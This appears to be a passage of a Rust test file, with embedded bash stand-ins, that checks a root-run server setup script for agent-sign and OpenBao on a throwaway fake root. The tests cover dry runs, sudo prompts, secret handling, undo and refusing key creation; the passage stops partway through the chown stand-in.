//! The server sitting script, tested on a throwaway root with stand-ins
//! (design: docs/system-mode.md, section 8 "The sitting script", build step
//! 5; the suite PM's decisions D5 and D6 in `ci-decisions.md`). Written
//! BEFORE the script, by an agent other than its builder.
//!
//! `scripts/sitting/agent-sign-sitting.sh` runs as root's administrator
//! (Taylor, with sudo), so a mistake in it is a mistake as root. These tests
//! run the real script, as an ordinary account, in a throwaway "machine"
//! made of a folder and a few stand-in programs, and check the properties
//! the design promises: a dry run changes nothing, a second run changes
//! nothing, every sudo prompt is named, the first failure stops the run,
//! no secret is printed, undo restores and deletes no data, the polkit rule
//! allows exactly the launcher to start and stop the slots' units, no
//! private key is ever written, an OpenBao older than 2.7.2 is refused, and
//! D5's removal of the agents account's own trust is done and then checked.
//!
//! **These tests are modelled on the suite's `scripts/sitting/test/run.sh`**
//! (a root folder, stand-ins first on `PATH`, hashes before and after).
//! Nothing here needs root, sudo, the network or a real OpenBao. Nothing
//! touches the machine they run on: every path the script is told to use is
//! under one temporary folder.
//!
//! # The interface these tests assume (the design leaves it open; chosen here)
//!
//! Invocation: `bash agent-sign-sitting.sh --machine hetzner --commit SHA
//! --source FILE [--slots N] [--dry-run] [--undo]`, with no other argument.
//!
//! * `AGENT_SIGN_SITTING_ROOT` is a prefix put in front of every system path
//!   the script reads or writes (`/etc`, `/opt`, `/var`, `/run`, `/usr`, and
//!   the agents' and the administrator's homes: `$ROOT/home/agents`;
//!   `$HOME` is `$ROOT/home/admin`). On the real machine it is empty. The
//!   text the script writes FOR the machine keeps real paths: unit files,
//!   `system.toml`, the polkit rule, the `gpg.ssh.allowedSignersFile` value
//!   (`/etc/agent-sign/allowed_signers`), the `gpg.ssh.program` value and
//!   the links under `~agents/.agent-sign/bin` never contain the prefix.
//! * Stand-ins for `sudo systemctl useradd groupadd usermod getent id
//!   whoami uname systemd-creds systemd-run curl bao git ssh-keygen install
//!   chown chgrp pkaction journalctl` are first on `PATH`. A stand-in `git`
//!   is also named by `AGENT_SIGN_SITTING_GIT` (the script calls
//!   `${AGENT_SIGN_SITTING_GIT:-/usr/bin/git}` for every git command). The
//!   stand-ins have their paths and settings written into them, so they work
//!   under `env -i`. `sudo` runs the command as the test's own account,
//!   after logging `user<TAB>prompt<TAB>command`; for `-u agents` it sets
//!   `HOME=$ROOT/home/agents`. `chown`, `chgrp` and `install -o -g` can't
//!   change owners; they record them in a ledger the tests read.
//! * The throwaway build: the script runs `systemd-run --wait --pipe ...`;
//!   the stand-in ignores the command and writes to its standard output a
//!   tar of the five built programs (`agent-sign agent-signd agent-launchd
//!   agent-git agent-ssh-sign`, at the top of the archive and also under
//!   `bin/`). The script takes the programs from that stream.
//! * OpenBao's version comes from `bao version`, `bao status -format=json`
//!   or `curl .../v1/sys/health`; all three stand-ins agree. The CA key is
//!   `ssh-agents-hetzner/public_key` (via `bao read` or `curl`).
//! * The administrator's delivered login is
//!   `$HOME/.config/credstore.encrypted/openbao-agent-sign-hetzner`
//!   (systemd-creds's `--user` form; the stand-in "encrypts" with base64) and
//!   holds the secret ID; the role ID is the login's name. The script moves
//!   them to `/etc/credstore.encrypted/agent-sign.secret-id` and
//!   `agent-sign.role-id` by pipe and removes the administrator's copy.
//! * The stand-in program installed as `agent-sign` answers every
//!   subcommand with exit 0 and the lines `ping: ok` and `authority:
//!   OpenBao CA matches the trust file`.
//! * Under a non-empty root the script can't ask a real kernel. End checks
//!   that need real accounts, processes, sockets, polkit or sessions (the
//!   agents account can't read the state, can't restart units, can't launch;
//!   the launcher's refusals; the probe session; the D6 slot checks) print
//!   `SKIP  <name>`, never `PASS` and never `FAIL`. Every check that can be
//!   made against files or stand-in calls (trust file, D5, units, polkit
//!   file, programs, settings) runs, and prints `PASS  <name>` or
//!   `FAIL  <name>`. The run exits 0 only if no check printed `FAIL`. On the
//!   real machine nothing is skipped (the design's eval 2: 0 FAIL on hetzner).
//! * Messages: a stop prints a line starting `Stopped:` that names the cause
//!   in plain words, exits non-zero, and prints no shell error trace.
//!   `--dry-run` prints `would:` lines; a step with nothing to do prints
//!   `kept:`.
//! * `AGENT_SIGN_SITTING_SCRIPT` (tests only) points these tests at another
//!   copy of the script; unset, they run `scripts/sitting/agent-sign-sitting.sh`
//!   of this repository.
//!
//! # Today
//!
//! `scripts/sitting/agent-sign-sitting.sh` doesn't exist, so every test here
//! fails at its first assertion that the script ran ("expected exit 0, got
//! 127 ... No such file"); each doc comment says what the test checks once
//! the script exists.
//!
//! # Added after the independent review of 1 Nov 2026 (A-1 to A-11, B-1)
//!
//! The tests at the end of this file (section "the review of 1 Nov 2026")
//! were written BEFORE the fixes, by an agent other than their builder. They
//! follow the orchestrator's interfaces exactly:
//!
//! * I-A2: a root-owned folder `/var/lib/agent-launch-io` (`specs/`, `logs/`,
//!   mode 0750, root:agent-launch) holding one pre-created regular file per
//!   slot (`specs/<n>.json`, `logs/<n>.out`, agent-launch:agent-launch, 0600).
//!   Every path a slot unit's systemd opens as root lies under it.
//! * I-A3: `sudo -k` (through the script's own sudo wrapper) before the first
//!   run of any installed program; `check-binary-clean.sh` comes from the
//!   sitting's own folder, never from the source.
//! * I-A6: `--source` is a git bundle; the script verifies it in a fresh,
//!   config-isolated repository and builds from `git archive <commit>`.
//! * I-A9: `AGENT_SIGN_SITTING_ROOT` and `_GIT` are honoured only together
//!   with `AGENT_SIGN_SITTING_TEST=1` (every run of these tests sets it).
//! * I-B1: `--login-pending`, accepted only with `--dry-run`.
//!
//! The stand-ins gained: a modelled sudo ticket (`sudo -k` ends it; the
//! installed programs log whether it was cached), per-call argv and stdin of
//! `systemd-run`, a log of the git environment, faithful git config
//! isolation, and failure modes of `systemd-creds encrypt`.

#![cfg(unix)]
// DELIBERATE EVAL CHANGE: these tests start their agent with `agent-sign launch`, and the launcher exists only on
// Linux (no launcher on macOS yet, listed in the README's gaps), so they run only where the launcher exists.
#![cfg(target_os = "linux")]

use std::cell::RefCell;
use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use base64::Engine;
use sha2::{Digest, Sha256};
use ssh_key::public::{Ed25519PublicKey, KeyData};
use tempfile::{TempDir, tempdir};

// ---------------------------------------------------------------- constants

const MACHINE: &str = "hetzner";

/// The settings file of the stand-in machine (see `Machine::machine_env_dir`).
const MACHINE_ENV: &str = "TAILNET_NAME=hetzner\n\
AUTH_ADDRESS=https://hetzner.example.ts.net:8200\n\
AUTH_CA_CERT=/usr/local/share/openbao/ca.pem\n\
AUTH_RESOLVE=100.64.0.10\n\
AUTH_MOUNT=ssh-agents-hetzner\n\
AUTH_ROLE=agent-sign-hetzner\n\
LOGIN_NAME=agent-sign-hetzner\n\
IDENTITY_PEOPLE=Taylor\n";
// DELIBERATE EVAL CHANGE (P1, Taylor's prompt rule of 1 Nov 2026, through the suite PM): the
// contract value of SITTING_SUDO_PROMPT_PREFIX is now "<machine> sudo (<account>)" and the
// script appends ": " itself. It was "hetzner: your taylor password, for sudo", to which the
// script added " (<why>): ". The reason no longer sits in the prompt (see
// `every_sudo_prompt_is_exactly_machine_sudo_account_and_the_reason_is_one_line_before_it`).
const PREFIX: &str = "hetzner sudo (taylor)";
/// A made-up OpenBao secret ID, planted in the administrator's delivered
/// login. Not a credential for anything.
const SECRET_ID: &str = "7c1d5e9a-3b2f-4a86-9d0e-5f1a2b3c4d5e";
/// A made-up token planted in the script's environment.
const ENV_TOKEN: &str = "s.PLANTEDTOKEN0a1b2c3d4e5f6a7b8c9d";
const PROGRAMS: [&str; 5] = [
    "agent-sign",
    "agent-signd",
    "agent-launchd",
    "agent-git",
    "agent-ssh-sign",
];
const BLOCK_BEGIN: &str = "# agent-sign: agents' certificate authorities, managed; do not edit";
const BLOCK_END: &str = "# agent-sign: end of agents' certificate authorities";
const AGENT_PROGRAM: &str = "/opt/agent-sign/current/bin/agent-ssh-sign";
const TRUST_PATH: &str = "/etc/agent-sign/allowed_signers";

// ---------------------------------------------------------------- helpers

fn sha_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

fn b64(s: &str) -> String {
    base64::engine::general_purpose::STANDARD.encode(s)
}

/// A public key made in memory (the private half is dropped at once and
/// never written anywhere).
fn random_public_key() -> String {
    let seed: [u8; 32] = rand::random();
    let sk = ed25519_dalek::SigningKey::from_bytes(&seed);
    let data = KeyData::Ed25519(Ed25519PublicKey(sk.verifying_key().to_bytes()));
    ssh_key::PublicKey::new(data, "")
        .to_openssh()
        .expect("encode a public key")
        .trim()
        .to_string()
}

fn script_path() -> PathBuf {
    match std::env::var("AGENT_SIGN_SITTING_SCRIPT") {
        Ok(p) if !p.is_empty() => PathBuf::from(p),
        _ => {
            PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("scripts/sitting/agent-sign-sitting.sh")
        }
    }
}

/// What a run of the script printed and how it ended.
struct Run {
    code: i32,
    stdout: String,
    stderr: String,
}

impl Run {
    fn text(&self) -> String {
        format!("{}{}", self.stdout, self.stderr)
    }
}

fn must_succeed(run: &Run, what: &str) {
    assert_eq!(
        run.code, 0,
        "{what}: expected exit 0, got {}\n--- stdout ---\n{}\n--- stderr ---\n{}",
        run.code, run.stdout, run.stderr
    );
}

/// The run stopped, non-zero, with a `Stopped:` line in plain words that
/// names (any of) `keywords`, and no shell error trace.
fn must_stop_plainly(run: &Run, what: &str, keywords: &[&str]) {
    let t = run.text();
    assert_ne!(
        run.code, 0,
        "{what}: expected the run to stop with a failure, but it exited 0\n{t}"
    );
    let line = t
        .lines()
        .find(|l| l.trim_start().starts_with("Stopped:"))
        .unwrap_or_else(|| panic!("{what}: no `Stopped:` line in the output\n{t}"));
    let low = line.to_lowercase();
    assert!(
        keywords.iter().any(|k| low.contains(&k.to_lowercase())),
        "{what}: the Stopped line should name the cause (one of {keywords:?}): {line}\n{t}"
    );
    for trace in [
        "command not found",
        "unbound variable",
        "syntax error",
        "bad substitution",
        "Traceback",
    ] {
        assert!(
            !t.contains(trace),
            "{what}: the output shows a shell error ({trace}), not a plain message\n{t}"
        );
    }
}

fn check_lines(run: &Run) -> Vec<(String, String)> {
    run.stdout
        .lines()
        .filter_map(|l| {
            let l = l.trim_start();
            for tag in ["PASS", "FAIL", "SKIP"] {
                if let Some(rest) = l.strip_prefix(tag)
                    && rest.starts_with(char::is_whitespace)
                {
                    return Some((tag.to_string(), rest.trim().to_string()));
                }
            }
            None
        })
        .collect()
}

// ---------------------------------------------------------------- snapshots

fn walk(base: &Path, dir: &Path, out: &mut BTreeMap<String, String>) {
    let Ok(rd) = fs::read_dir(dir) else { return };
    let mut entries: Vec<_> = rd.flatten().collect();
    entries.sort_by_key(|e| e.file_name());
    for e in entries {
        let p = e.path();
        let rel = p.strip_prefix(base).unwrap().to_string_lossy().to_string();
        let md = fs::symlink_metadata(&p).unwrap();
        let mode = md.permissions().mode() & 0o7777;
        if md.file_type().is_symlink() {
            let t = fs::read_link(&p).unwrap();
            out.insert(rel, format!("link -> {}", t.display()));
        } else if md.is_dir() {
            out.insert(rel, format!("dir {mode:o}"));
            walk(base, &p, out);
        } else {
            let d = match fs::read(&p) {
                Ok(b) => sha_hex(&b),
                Err(_) => "unreadable".to_string(),
            };
            out.insert(rel, format!("file {mode:o} {d}"));
        }
    }
}

/// Every path under `dir` with its kind, mode, and (files) SHA-256 or (links)
/// target. Times are left out.
fn snapshot(dir: &Path) -> BTreeMap<String, String> {
    let mut m = BTreeMap::new();
    walk(dir, dir, &mut m);
    m
}

fn diff(before: &BTreeMap<String, String>, after: &BTreeMap<String, String>) -> Vec<String> {
    let mut out = Vec::new();
    for (k, v) in before {
        match after.get(k) {
            None => out.push(format!("removed: {k}")),
            Some(a) if a != v => out.push(format!("changed: {k}: {v} => {a}")),
            _ => {}
        }
    }
    for k in after.keys() {
        if !before.contains_key(k) {
            out.push(format!("added: {k}"));
        }
    }
    out
}

fn in_tree(path: &str, tree: &str) -> bool {
    path == tree || path.starts_with(&format!("{tree}/"))
}

// ---------------------------------------------------------------- stand-ins

/// Written at the top of every stand-in; `@NAME@` are filled in per machine.
const PRELUDE: &str = r#"#!/usr/bin/env bash
# A stand-in for the sitting script's tests (tests/test_sitting_script.rs).
set -u
R='@ROOT@'; LOG='@LOG@'; ST='@STATE@'; CONF='@CONF@'; BUILD_TAR='@BUILD_TAR@'
BAO_VERSION=2.7.2; BAO_SEALED=0; CA_RAW=''; ME=taylor
FAIL_USERADD=''; FAIL_SYSTEMCTL=''; LIE_USER_UNIT=0; LIE_GIT_UNSET=0; BUILD_FAIL=0; CURL_FAIL=0
BUILD_FAIL_OUT=''; BUILD_FAIL_PHASE=''; BUILD_FAIL_RC=1; TEE_FAIL=0
CREDS_ENCRYPT_FAIL=0; CREDS_ENCRYPT_EMPTY=0
[ -f "$CONF" ] && . "$CONF"
next_seq() { local n; n=$(cat "$LOG/seq" 2>/dev/null || echo 0); n=$((n + 1)); echo "$n" > "$LOG/seq"; echo "$n"; }
note() { printf '%s\t%s\t%s\n' "$(next_seq)" "$1" "${2//$'\n'/ }" >> "$LOG/calls"; }
mutation() { printf '%s\t%s\n' "$1" "${2//$'\n'/ }" >> "$LOG/mutations"; }
rel() { local p=$1; case "$p" in "$R"/*) p=${p#"$R"/};; /*) p=${p#/};; esac; printf '%s' "$p"; }
ledger_get() { local r v; r=$(rel "$1"); v=$(awk -F'\t' -v p="$r" '$1==p {v=$2} END {print v}' "$ST/owners" 2>/dev/null); printf '%s' "${v:-root:root}"; }
ledger_set() { printf '%s\t%s\n' "$(rel "$1")" "$2" >> "$ST/owners"; }
add_member() { awk -F: -v OFS=: -v g="$1" -v u="$2" '$1==g { if ($4=="") $4=u; else if (index("," $4 ",", "," u ",")==0) $4=$4 "," u } { print }' "$R/etc/group" > "$R/etc/group.stub" && mv "$R/etc/group.stub" "$R/etc/group"; }
"#;

const SUDO: &str = r#"
prompt=''; user=root; kflag=0
while [ $# -gt 0 ]; do
  case "$1" in
    -p) prompt=$2; shift 2 ;;
    -k|-K|--reset-timestamp|--remove-timestamp) kflag=1; shift ;;
    --prompt=*) prompt=${1#--prompt=}; shift ;;
    -u) user=$2; shift 2 ;;
    --user=*) user=${1#--user=}; shift ;;
    -v) printf '%s\t%s\t%s\n' "$user" "$prompt" "-v" >> "$LOG/sudo"; touch "$LOG/ticket"; exit 0 ;;
    --) shift; break ;;
    -*) shift ;;
    *) break ;;
  esac
done
# The stand-in models sudo's cached ticket: a sudo that runs makes one, sudo -k ends it (and is
# recorded in calls as sudo-k). The installed programs log whether it was cached when they ran.
if [ $kflag = 1 ]; then rm -f "$LOG/ticket"; note sudo-k "$user"; [ $# -eq 0 ] && exit 0; fi
cmd="$*"; cmd=${cmd//$'\n'/ }
printf '%s\t%s\t%s\n' "$user" "$prompt" "$cmd" >> "$LOG/sudo"
note sudo-cmd "$user $cmd"
touch "$LOG/ticket"
line=$(grep "^$user:" "$R/etc/passwd" | head -1)
[ -n "$line" ] || { echo "sudo: unknown user $user" >&2; exit 1; }
home=$(echo "$line" | cut -d: -f6)
[ "$user" = root ] && home=/root
export HOME="$R$home" STUB_AS_USER="$user"
# L2 (review 3): sudo-rs 0.2.13 may read ahead on its standard input. Modelled (conf SUDO_EATS_STDIN=1)
# for the one input where it matters: when stdin is the sitting's manifest file, sudo takes the rest of it.
if [ "${SUDO_EATS_STDIN:-0}" = 1 ]; then
  case "$(readlink /proc/self/fd/0 2>/dev/null)" in */manifest) cat >/dev/null ;; esac
fi
# A write as the agents account that is said to work and is lost (conf SUDO_LOSES_AGENT_WRITES=1): the
# restored file would not match its saved copy.
if [ "${SUDO_LOSES_AGENT_WRITES:-0}" = 1 ] && [ "$user" = agents ] && [ "${1:-}" = /usr/bin/tee ]; then
  cat >/dev/null; exit 0
fi
# The agents account logs in with its own bin folder first on PATH (its .bashrc); a script that
# trusts that PATH runs the hostile stand-in there.
[ "$user" = agents ] && export PATH="$R$home/.agent-sign/bin:$PATH"
exec "$@"
"#;

const ID: &str = r#"
u=0; g=0; n=0; G=0; name=''
for a in "$@"; do case "$a" in
  -u) u=1;; -g) g=1;; -n) n=1;; -G) G=1;; -un|-nu) u=1; n=1;; -gn|-ng) g=1; n=1;; -r) ;; -*) ;; *) name=$a;;
esac; done
[ -n "$name" ] || name=${STUB_AS_USER:-$ME}
line=$(grep "^$name:" "$R/etc/passwd" | head -1)
[ -n "$line" ] || { echo "id: '$name': no such user" >&2; exit 1; }
uid=$(echo "$line" | cut -d: -f3); gid=$(echo "$line" | cut -d: -f4)
gname=$(awk -F: -v g="$gid" '$3==g {print $1; exit}' "$R/etc/group")
if [ $u = 1 ]; then [ $n = 1 ] && echo "$name" || echo "$uid"
elif [ $g = 1 ]; then [ $n = 1 ] && echo "$gname" || echo "$gid"
elif [ $G = 1 ]; then echo "$gid"
else echo "uid=$uid($name) gid=$gid($gname) groups=$gid($gname)"; fi
"#;

const WHOAMI: &str = r#"
echo "${STUB_AS_USER:-$ME}"
"#;

const GETENT: &str = r#"
db=${1:-}; key=${2:-}
case "$db" in passwd|group) f="$R/etc/$db" ;; *) exit 2 ;; esac
if [ -z "$key" ]; then cat "$f"; exit 0; fi
if [[ "$key" =~ ^[0-9]+$ ]]; then awk -F: -v k="$key" '$3==k {print; f=1} END {exit !f}' "$f" || exit 2
else grep "^$key:" "$f" || exit 2; fi
"#;

const UNAME: &str = r#"
case "${1:-}" in -r) echo 7.0.0-stub ;; -m) echo x86_64 ;; -s) echo Linux ;; *) echo "Linux stub 7.0.0-stub x86_64 GNU/Linux" ;; esac
"#;

const USERADD: &str = r#"
ORIG="$*"; name=''; home=/nonexistent; shell=/bin/bash; comment=''; gid=''; groups=''; uid=''; nogroup=0
while [ $# -gt 0 ]; do case "$1" in
  -d|--home-dir|--home) home=$2; shift 2 ;;
  -s|--shell) shell=$2; shift 2 ;;
  -c|--comment) comment=$2; shift 2 ;;
  -g|--gid) gid=$2; shift 2 ;;
  -G|--groups) groups=$2; shift 2 ;;
  -u|--uid) uid=$2; shift 2 ;;
  -k|-K|-b|-e|-f|-p|-R|-P|--skel|--key|--base-dir|--expiredate|--inactive|--password|--root|--prefix) shift 2 ;;
  -N|--no-user-group) nogroup=1; shift ;;
  -*) shift ;;
  *) name=$1; shift ;;
esac; done
note useradd "$ORIG"
for p in $FAIL_USERADD; do [ "$p" = "$name" ] && { echo "useradd: stand-in made to fail for $name" >&2; mutation useradd "$ORIG (failed)"; exit 1; }; done
grep -q "^$name:" "$R/etc/passwd" && { echo "useradd: user '$name' already exists" >&2; exit 9; }
mutation useradd "$ORIG"
used=$(cut -d: -f3 "$R/etc/passwd" "$R/etc/group" | sort -n | uniq)
n=900; while echo "$used" | grep -qx "$n"; do n=$((n + 1)); done
[ -n "$uid" ] || uid=$n
if [ -z "$gid" ] && [ $nogroup = 0 ]; then
  grep -q "^$name:" "$R/etc/group" && { echo "useradd: group '$name' exists" >&2; exit 9; }
  gid=$uid; printf '%s:x:%s:\n' "$name" "$gid" >> "$R/etc/group"
elif [ -n "$gid" ] && ! [[ "$gid" =~ ^[0-9]+$ ]]; then
  g=$(awk -F: -v g="$gid" '$1==g {print $3; exit}' "$R/etc/group"); [ -n "$g" ] || { echo "useradd: group '$gid' does not exist" >&2; exit 6; }; gid=$g
fi
printf '%s:x:%s:%s:%s:%s:%s\n' "$name" "$uid" "${gid:-100}" "$comment" "$home" "$shell" >> "$R/etc/passwd"
for g in ${groups//,/ }; do add_member "$g" "$name"; done
exit 0
"#;

const GROUPADD: &str = r#"
ORIG="$*"; name=''; gid=''
while [ $# -gt 0 ]; do case "$1" in -g|--gid) gid=$2; shift 2 ;; -*) shift ;; *) name=$1; shift ;; esac; done
note groupadd "$ORIG"
grep -q "^$name:" "$R/etc/group" && { echo "groupadd: group '$name' already exists" >&2; exit 9; }
mutation groupadd "$ORIG"
used=$(cut -d: -f3 "$R/etc/passwd" "$R/etc/group" | sort -n | uniq)
n=900; while echo "$used" | grep -qx "$n"; do n=$((n + 1)); done
printf '%s:x:%s:\n' "$name" "${gid:-$n}" >> "$R/etc/group"
"#;

const USERMOD: &str = r#"
ORIG="$*"; name=''; groups=''; shell=''
while [ $# -gt 0 ]; do case "$1" in
  -a|-L|-U|--append) shift ;; -G|--groups) groups=$2; shift 2 ;; -aG|-Ga) groups=$2; shift 2 ;;
  -s|--shell) shell=$2; shift 2 ;; -d|-c|-g|-u|-e|-f|-l) shift 2 ;; -*) shift ;; *) name=$1; shift ;;
esac; done
note usermod "$ORIG"
grep -q "^$name:" "$R/etc/passwd" || { echo "usermod: user '$name' does not exist" >&2; exit 6; }
mutation usermod "$ORIG"
for g in ${groups//,/ }; do
  grep -q "^$g:" "$R/etc/group" || { echo "usermod: group '$g' does not exist" >&2; exit 6; }
  add_member "$g" "$name"
done
if [ -n "$shell" ]; then
  awk -F: -v OFS=: -v u="$name" -v s="$shell" '$1==u {$7=s} {print}' "$R/etc/passwd" > "$R/etc/passwd.stub" && mv "$R/etc/passwd.stub" "$R/etc/passwd"
fi
exit 0
"#;

const NO_DELETE: &str = r#"
note forbidden-delete "$0 $*"
mutation "FORBIDDEN-$(basename "$0")" "$*"
echo "$(basename "$0"): refused: nothing is deleted" >&2
exit 1
"#;

const SYSTEMD_CREDS: &str = r#"
note systemd-creds "$*"
args=(); for a in "$@"; do case "$a" in --*) ;; *) args+=("$a") ;; esac; done
verb=${args[0]:-}
case "$verb" in
  encrypt)
    mutation systemd-creds-encrypt "${args[*]}"
    in=${args[1]:--}; out=${args[2]:--}
    if [ "$in" = - ]; then src=/dev/stdin; else src=$in; fi
    # Failure modes (A-5): it writes part of the output and fails, or writes nothing and succeeds.
    if [ "$out" != - ] && [ "$CREDS_ENCRYPT_FAIL" = 1 ]; then cat < "$src" > /dev/null; printf partial > "$out"; exit 1; fi
    if [ "$out" != - ] && [ "$CREDS_ENCRYPT_EMPTY" = 1 ]; then cat < "$src" > /dev/null; : > "$out"; exit 0; fi
    if [ "$out" = - ]; then base64 < "$src"; else base64 < "$src" > "$out"; fi ;;
  decrypt)
    in=${args[1]:--}; out=${args[2]:--}
    if [ "$in" = - ]; then src=/dev/stdin; else src=$in; fi
    if [ "$out" = - ]; then base64 -d < "$src"; else base64 -d < "$src" > "$out"; fi ;;
  *) exit 0 ;;
esac
"#;

const SYSTEMD_RUN: &str = r#"
ORIG="$*"
note systemd-run "$ORIG"
mutation systemd-run "$ORIG"
srn=$(( $(ls "$LOG"/sr.*.args 2>/dev/null | wc -l) + 1 ))
for a in "$@"; do printf '%s\037' "$a"; done > "$LOG/sr.$srn.args"
[ "$BUILD_FAIL" = 1 ] && { echo "systemd-run: the build failed (stand-in)" >&2; exit 1; }
# BUILD_FAIL_OUT (a file) and BUILD_FAIL_PHASE (fetch or compile): that phase writes the file's text as its
# messages (standard error) and exits with BUILD_FAIL_RC, as a real build that fails part-way does.
if [ -n "$BUILD_FAIL_OUT" ] && [ "${ORIG##* }" = "$BUILD_FAIL_PHASE" ]; then
  cat > /dev/null; cat "$BUILD_FAIL_OUT" >&2; exit "$BUILD_FAIL_RC"
fi
cat > "$LOG/sr.$srn.in" 2>/dev/null || true
case "$ORIG" in *--pipe*) cat "$BUILD_TAR" ;; esac
exit 0
"#;

// tee: the real one, except that with TEE_FAIL=1 it cannot write the build's log (build-*.log):
// it still passes its input on, as GNU tee does, and exits 1.
const TEE: &str = r#"
for a in "$@"; do case "$a" in */build-*.log) if [ "$TEE_FAIL" = 1 ]; then cat; exit 1; fi ;; esac; done
exec /usr/bin/tee "$@"
"#;

const CURL: &str = r#"
url=''; out=''; fail=0
while [ $# -gt 0 ]; do case "$1" in
  -o|--output) out=$2; shift 2 ;;
  --fail|--fail-with-body) fail=1; shift ;;
  --cacert|--resolve|-m|--max-time|-H|--header|-X|--request|-d|--data|-w|--write-out|--connect-timeout|--retry|--cert|--key|-K|--config|-u|--user|--data-binary) shift 2 ;;
  http*) url=$1; shift ;;
  -[a-zA-Z]*) case "$1" in *f*) fail=1 ;; esac; shift ;;
  *) shift ;;
esac; done
note curl "$url"
[ "$CURL_FAIL" = 1 ] && exit 7
sealed=false; [ "$BAO_SEALED" = 1 ] && sealed=true
case "$url" in
  */v1/sys/health*|*/v1/sys/seal-status*)
    body=$(printf '{"initialized":true,"sealed":%s,"standby":false,"version":"%s"}' "$sealed" "$BAO_VERSION")
    if [ "$sealed" = true ] && [ $fail = 1 ]; then echo "curl: (22) The requested URL returned error: 503" >&2; exit 22; fi ;;
  */v1/ssh-agents-*/public_key*)
    k=${CA_RAW//$'\n'/\\n}
    body=$(printf '{"request_id":"stub","data":{"public_key":"%s\\n"}}' "$k") ;;
  *) body='{}' ;;
esac
if [ -n "$out" ] && [ "$out" != - ] && [ "$out" != /dev/null ]; then printf '%s\n' "$body" > "$out"; else printf '%s\n' "$body"; fi
"#;

const BAO: &str = r#"
ORIG="$*"; sub=''; fmt=''; field=''; path=''
for a in "$@"; do case "$a" in
  -format=json|-format\ json) fmt=json ;; -field=*) field=${a#-field=} ;; -*) ;;
  *) if [ -z "$sub" ]; then sub=$a; elif [ -z "$path" ]; then path=$a; fi ;;
esac; done
note bao "$ORIG"
sealed=false; [ "$BAO_SEALED" = 1 ] && sealed=true
case "$sub" in
  version) echo "OpenBao v$BAO_VERSION (stub), built 2026-10-01T00:00:00Z" ;;
  status)
    if [ "$fmt" = json ]; then printf '{"type":"shamir","initialized":true,"sealed":%s,"version":"%s"}\n' "$sealed" "$BAO_VERSION"
    else printf 'Seal Type  shamir\nInitialized  true\nSealed  %s\nVersion  %s\n' "$sealed" "$BAO_VERSION"; fi
    [ "$sealed" = true ] && exit 2; exit 0 ;;
  read)
    case "$path" in
      ssh-agents-*/public_key)
        if [ -n "$field" ]; then printf '%s\n' "$CA_RAW"
        else k=${CA_RAW//$'\n'/\\n}; printf '{"data":{"public_key":"%s\\n"}}\n' "$k"; fi ;;
      *) echo "bao: no value at $path" >&2; exit 2 ;;
    esac ;;
  write|delete|secrets|auth|policy|operator|login|token|patch|unwrap|rewrap) mutation bao "$ORIG" ;;
  *) ;;
esac
exit 0
"#;

const GIT: &str = r#"
ORIG="$*"; ARGS=("$@")
export HOME="${HOME:-/nonexistent}"
note git "$ORIG"
is_write=0
if [ "${1:-}" = config ]; then
  shift; vals=0; read_only=0
  while [ $# -gt 0 ]; do case "$1" in
    --unset|--unset-all|--remove-section|--rename-section|--add|--replace-all|-e|--edit) is_write=1 ;;
    --get|--get-all|--get-regexp|--list|-l) read_only=1 ;;
    -f|--file|--type|--default|--blob) shift ;;
    -*) ;;
    *) vals=$((vals + 1)) ;;
  esac; shift; done
  [ $read_only = 0 ] && [ $vals -ge 2 ] && is_write=1
fi
if [ $is_write = 1 ]; then
  mutation git "$ORIG"
  if [ "$LIE_GIT_UNSET" = 1 ]; then case " $ORIG " in *" --unset"*|*" --remove-section"*) exit 0 ;; esac; fi
fi
# What the caller gave (A-6): the isolation a script asks for is kept, never overridden.
printf '%s\t%s\t%s\n' "${ORIG//$'\n'/ }" "${GIT_CONFIG_GLOBAL-<unset>}" "${GIT_CONFIG_NOSYSTEM-<unset>}" >> "$LOG/git-env"
iso_system=0; [ "${GIT_CONFIG_NOSYSTEM-}" = 1 ] && iso_system=1
if [ -z "${GIT_CONFIG_GLOBAL+x}" ]; then export GIT_CONFIG_GLOBAL="$HOME/.gitconfig"; fi
if [ $iso_system = 1 ]; then unset GIT_CONFIG_SYSTEM; else export GIT_CONFIG_SYSTEM="$R/etc/gitconfig"; unset GIT_CONFIG_NOSYSTEM GIT_DIR GIT_WORK_TREE; fi
unset GIT_CONFIG_COUNT
case " $ORIG " in
  *" --show-origin "*) /usr/bin/git "${ARGS[@]}" | sed "s#^file:$R#file:#"; exit "${PIPESTATUS[0]}" ;;
  *) exec /usr/bin/git "${ARGS[@]}" ;;
esac
"#;

const SSH_KEYGEN: &str = r#"
note ssh-keygen "$*"
for a in "$@"; do case "$a" in
  -t|-N|-b|-A) mutation keygen "$*"; echo "ssh-keygen stand-in: no key may be made here: $*" >&2; exit 99 ;;
esac; done
exec /usr/bin/ssh-keygen "$@"
"#;

const INSTALL: &str = r#"
ORIG="$*"; keep=(); pos=(); owner=''; group=''; dmode=0
while [ $# -gt 0 ]; do case "$1" in
  -o) owner=$2; shift 2 ;; --owner=*) owner=${1#--owner=}; shift ;;
  -g) group=$2; shift 2 ;; --group=*) group=${1#--group=}; shift ;;
  -m|--mode|-t|--target-directory|-S|--suffix|-Dm|-dm|-Cm|-cm) keep+=("$1" "$2"); shift 2 ;;
  -d|--directory) dmode=1; keep+=("$1"); shift ;;
  -*) keep+=("$1"); shift ;;
  *) keep+=("$1"); pos+=("$1"); shift ;;
esac; done
note install "$ORIG"
mutation install "$ORIG"
/usr/bin/install "${keep[@]}" || exit $?
own=${owner:-root}; grp=${group:-root}
if [ $dmode = 1 ]; then for p in "${pos[@]}"; do ledger_set "$p" "$own:$grp"; done
elif [ ${#pos[@]} -gt 0 ]; then ledger_set "${pos[${#pos[@]} - 1]}" "$own:$grp"; fi
exit 0
"#;

const CHOWN: &str = r#"
ORIG="$*"; rec=0; spec=''; files=()
for a in "$@"; do case "$a" in
  -R|--recursive) rec=1 ;; -*) ;;
  *) if [ -z "$spec" ]; then spec=$a; else files+=("$a"); fi ;;
esac; done
note chown "$ORIG"
ow=${spec%%:*}; gr=''; case "$spec" in *:*) gr=${spec#*:} ;; esac
for f in "${files[@]}"; do
  [ -e "$f" ] || [ -L "$f" ] || { echo "chown: cannot access '$f': No such file or directory" >&2; exit 1; }
  cur=$(ledger_get "$f"); co=${cur%%:*}; cg=${cur#*:}
